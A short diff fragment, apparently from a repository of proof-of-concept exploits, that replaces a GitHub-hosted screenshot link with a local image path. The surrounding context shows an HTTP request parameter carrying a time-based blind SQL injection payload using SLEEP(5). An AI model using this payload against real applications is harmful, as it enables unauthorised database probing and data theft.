@@ -16,4 +16,4 @@ Content-Length: 0
 
 WHERE_STR=-@`'` AND (SELECT 4916 FROM (SELECT(SLEEP(5)))Xsep)
 ```
-![cb79742fa584a2c53129432d2c79eaed](https://github.com/wy876/POC/assets/139549762/90cd86b0-8e67-4eb8-bc38-896ad6b78be5)
+![cb79742fa584a2c53129432d2c79eaed](../../images/90cd86b0-8e67-4eb8-bc38-896ad6b78be5.png)
